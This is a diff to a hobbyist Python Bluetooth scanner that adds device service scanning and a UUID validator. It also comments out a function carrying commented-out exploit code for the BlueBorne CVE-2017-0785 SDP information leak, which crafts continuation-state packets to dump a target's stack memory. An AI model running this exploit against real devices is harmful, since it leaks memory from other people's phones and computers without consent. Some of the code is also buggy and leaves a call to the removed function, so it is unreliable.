@@ -4,63 +4,63 @@ import socket
 import argparse
 import bluetooth
 
-#Testing blueborne code from https://github.com/ojasookert/CVE-2017-0785/blob/master/CVE-2017-0785.py
-def scanMAC(macAddr):
-
-    sock=bluetooth.BluetoothSocket(bluetooth.L2CAP)
-
-    bd_addr = macAddr
-    port = 0x1001
-
-    sock.connect((bd_addr, port))
-
-    sock.send("hello!!")
-
-    sock.close()
-    # service_long = 0x0100
-    # service_short = 0x0001
-    # mtu = 50
-    # n = 30
-    #
-    # def packet(service, continuation_state):
-    #     pkt = '\x02\x00\x00'
-    #     pkt += str(pwn.p16(7 + len(continuation_state)))
-    #     pkt += '\x35\x03\x19'
-    #     pkt += str(pwn.p16(service))
-    #     pkt += '\x01\x00'
-    #     pkt += continuation_state
-    #     return pkt
-    #
-    # p = pwn.log.progress('Exploit')
-    # p.status('Creating L2CAP socket')
-    #
-    # sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
-    # bluetooth.set_l2cap_mtu(sock, mtu)
-    # pwn.context.endian = 'big'
-    #
-    # p.status('Connecting to target')
-    # sock.connect((macAddr, 1))
-    #
-    # p.status('Sending packet 0')
-    # sock.send(packet(service_long, '\x00'))
-    # data = sock.recv(mtu)
-    #
-    # if data[-3] != '\x02':
-    #     pwn.log.error('Invalid continuation state received.')
-    #
-    # stack = ''
-    #
-    # for i in range(1, n):
-    #     p.status('Sending packet %d' % i)
-    #     sock.send(packet(service_short, data[-3:]))
-    #     data = sock.recv(mtu)
-    #     stack += data[9:-3]
-    #
-    # sock.close()
-    #
-    # p.success('Done')
-    #
-    # print(hexdump(stack))
+# #Testing blueborne code from https://github.com/ojasookert/CVE-2017-0785/blob/master/CVE-2017-0785.py
+# def scanMAC(macAddr):
+#
+#     sock=bluetooth.BluetoothSocket(bluetooth.L2CAP)
+#
+#     bd_addr = macAddr
+#     port = 0x1001
+#
+#     sock.connect((bd_addr, port))
+#
+#     sock.send("hello!!")
+#
+#     sock.close()
+#     # service_long = 0x0100
+#     # service_short = 0x0001
+#     # mtu = 50
+#     # n = 30
+#     #
+#     # def packet(service, continuation_state):
+#     #     pkt = '\x02\x00\x00'
+#     #     pkt += str(pwn.p16(7 + len(continuation_state)))
+#     #     pkt += '\x35\x03\x19'
+#     #     pkt += str(pwn.p16(service))
+#     #     pkt += '\x01\x00'
+#     #     pkt += continuation_state
+#     #     return pkt
+#     #
+#     # p = pwn.log.progress('Exploit')
+#     # p.status('Creating L2CAP socket')
+#     #
+#     # sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+#     # bluetooth.set_l2cap_mtu(sock, mtu)
+#     # pwn.context.endian = 'big'
+#     #
+#     # p.status('Connecting to target')
+#     # sock.connect((macAddr, 1))
+#     #
+#     # p.status('Sending packet 0')
+#     # sock.send(packet(service_long, '\x00'))
+#     # data = sock.recv(mtu)
+#     #
+#     # if data[-3] != '\x02':
+#     #     pwn.log.error('Invalid continuation state received.')
+#     #
+#     # stack = ''
+#     #
+#     # for i in range(1, n):
+#     #     p.status('Sending packet %d' % i)
+#     #     sock.send(packet(service_short, data[-3:]))
+#     #     data = sock.recv(mtu)
+#     #     stack += data[9:-3]
+#     #
+#     # sock.close()
+#     #
+#     # p.success('Done')
+#     #
+#     # print(hexdump(stack))
 
 #Scans all nearby bluetooth devices, return list of MACS and Device Names(if available). Devices must be in discoverable mode. Does not work with low power Bluetooth
 def scanAll():
@@ -72,33 +72,50 @@ def scanAll():
     for addr, name in nearby_devices:
         print(f'{addr}  -   {name}')
 
+#Scan all available Bluetooth connections for all available services
+def scanAllServices():
+    results = bluetooth.find_service(name = None, uuid = None, address = None)
+
+    for item in results:
+        print(item)
+
 #Scan services of all available bluetooth devices in range based on uuid value. Second arg for one device only
-def scanUUIDServices(uuidVal, addr = None){
+def scanUUIDServices(uuidVal, addr = None):
     service_matches = bluetooth.find_service(uuid = uuidVal, bdaddr = addr)
 
     if len(service_matches == 0):
         printf(f'No services matching {uuidVal} found.')
-
-    else:
-        print(f'|{'Host'^:10}|{'Name'^:10}|{'Protocol'^:10}|{'Port'^:10}|')
-        for match in service_matches:
-            print(f'|{match["host"]^:10}|{match["name"]^:10}|{match["protocol"]^:10}|{match["port"]^:10}|')
-}
+     #not working properly
+    # else:
+    #     print(f"|{"Host"^:10}|{"Name"^:10}|{"Protocol"^:10}|{"Port"^:10}|"")
+    #     for match in service_matches:
+    #         print(f'|{match["host"]^:10}|{match["name"]^:10}|{match["protocol"]^:10}|{match["port"]^:10}|')
 
 #Scan services of all available bluetooth devices in range based on name. Second arg for one device only
-def scanNameServices(nameVal, addr = None){
+def scanNameServices(nameVal, addr = None):
     service_matches = bluetooth.find_service(name = nameVal, bdaddr = addr)
 
     if len(service_matches == 0):
         printf(f'No services matching {uuidVal} found.')
+    #not working properly
+    # else:
+    #     print(f'|{"Host"^:10}|{"Name"^:10}|{"Protocol"^:10}|{"Port"^:10}|')
+    #     for match in service_matches:
+    #         print(f'|{match["host"]^:10}|{match["name"]^:10}|{match["protocol"]^:10}|{match["port"]^:10}|')
 
-    else:
-        print(f'|{'Host'^:10}|{'Name'^:10}|{'Protocol'^:10}|{'Port'^:10}|')
-        for match in service_matches:
-            print(f'|{match["host"]^:10}|{match["name"]^:10}|{match["protocol"]^:10}|{match["port"]^:10}|')
-}
+#Verifies if input is a UUID of style 'XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX'
+def isUUID(input):
+    if input.count("-")!=4:
+        return False
+    if len(input) !=36:
+        return False
+    for section in input.split("-"):
+        for char in section:
+            if (char>"F" or (char<"A" and not char.isdigit())) or (char >= "a" and char <= "z"):
+                return False
+    return True
 
-#Verifies if input is a MAC address
+#Verifies if input is a MAC address of style 'XX:XX:XX:XX:XX:XX'
 def isMACAddress(input):
     if input.count(":")!=5:
         return False
@@ -134,6 +151,7 @@ def main():
         scanMAC(input)
     else:
         scanAll()
+        scanAllServices()
 
 
 
